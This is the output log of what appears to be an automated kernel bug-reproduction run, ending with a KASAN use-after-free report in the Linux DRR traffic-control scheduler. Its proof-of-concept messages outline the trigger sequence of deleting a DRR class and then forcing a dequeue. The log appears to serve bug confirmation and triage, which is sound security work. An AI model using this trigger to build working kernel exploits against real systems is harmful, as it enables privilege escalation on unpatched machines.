[    1.099671] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d c1 0c 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    1.100369] RSP: 002b:00007ffc27973f58 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    1.100659] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 000000000043c3c3
[    1.100930] RDX: 0000000000000024 RSI: 00007ffc27974f90 RDI: 0000000000000003
[    1.101203] RBP: 000000000047f06a R08: 00007ffc27973f64 R09: 000000000000000c
[    1.101474] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000005
[    1.101745] R13: 0000000000000004 R14: 00007ffc279750d0 R15: 00007ffc279750b7
[    1.102016]  </TASK>
[    1.102107] 
[    1.102172] Allocated by task 66:
[    1.102304]  kasan_save_stack+0x33/0x60
[    1.102455]  kasan_save_track+0x14/0x30
[    1.102607]  __kasan_kmalloc+0x8f/0xa0
[    1.102760]  drr_change_class+0x36f/0xae0
[    1.102917]  tc_ctl_tclass+0x3d6/0x12a0
[    1.103070]  rtnetlink_rcv_msg+0x365/0xa40
[    1.103333]  netlink_rcv_skb+0x12f/0x370
[    1.103488]  netlink_unicast+0x5c2/0x830
[    1.103641]  netlink_sendmsg+0x75c/0xc00
[    1.103794]  __sys_sendto+0x3ae/0x420
[    1.103942]  __x64_sys_sendto+0xdb/0x1b0
[    1.104097]  do_syscall_64+0xa6/0x1a0
[    1.104245]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.104442] 
[    1.104508] Freed by task 66:
[    1.104629]  kasan_save_stack+0x33/0x60
[    1.104782]  kasan_save_track+0x14/0x30
[    1.104935]  kasan_save_free_info+0x3b/0x60
[    1.105101]  __kasan_slab_free+0x37/0x50
[    1.105257]  kfree+0xcf/0x360
[    1.105377]  drr_delete_class+0x2c4/0x470
[    1.105534]  tc_ctl_tclass+0xe7d/0x12a0
[    1.105686]  rtnetlink_rcv_msg+0x365/0xa40
[    1.105845]  netlink_rcv_skb+0x12f/0x370
[    1.105998]  netlink_unicast+0x5c2/0x830
[    1.106153]  netlink_sendmsg+0x75c/0xc00
[    1.106306]  __sys_sendto+0x3ae/0x420
[    1.106451]  __x64_sys_sendto+0xdb/0x1b0
[    1.106604]  do_syscall_64+0xa6/0x1a0
[    1.106749]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.106945] 
[    1.107009] The buggy address belongs to the object at ffff88800999c700
[    1.107009]  which belongs to the cache kmalloc-128 of size 128
[    1.107479] The buggy address is located 88 bytes inside of
[    1.107479]  freed 128-byte region [ffff88800999c700, ffff88800999c780)
[    1.107935] 
[    1.108002] The buggy address belongs to the physical page:
[    1.108218] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x999c
[    1.108519] flags: 0x100000000000000(node=0|zone=1)
[    1.108714] page_type: f5(slab)
[    1.108843] raw: 0100000000000000 ffff888006841a00 dead000000000122 0000000000000000
[    1.109145] raw: 0000000000000000 0000000000100010 00000001f5000000 0000000000000000
[    1.109438] page dumped because: kasan: bad access detected
[    1.109652] 
[    1.109717] Memory state around the buggy address:
[    1.109902]  ffff88800999c600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
[    1.110179]  ffff88800999c680: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.110463] >ffff88800999c700: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.110746]                                                     ^
[    1.110989]  ffff88800999c780: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.111270]  ffff88800999c800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
[    1.111554] ==================================================================
[    1.111844] Disabling lock debugging due to kernel taint
poc: deleted DRR class 1:1 (unblocks dequeue)
[    1.112266] drr_dequeue: choke qdisc 3: is non-work-conserving?
poc: nudged drr_dequeue (dereferences freed drr_class)
poc: done (if KASAN didn't splat, rerun)
[    1.112983] poc (66) used greatest stack depth: 26344 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    1.449326] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    2.341391] ACPI: PM: Preparing to enter system sleep state S5
[    2.341833] reboot: Power down
CONFIRMED: KASAN_UAF
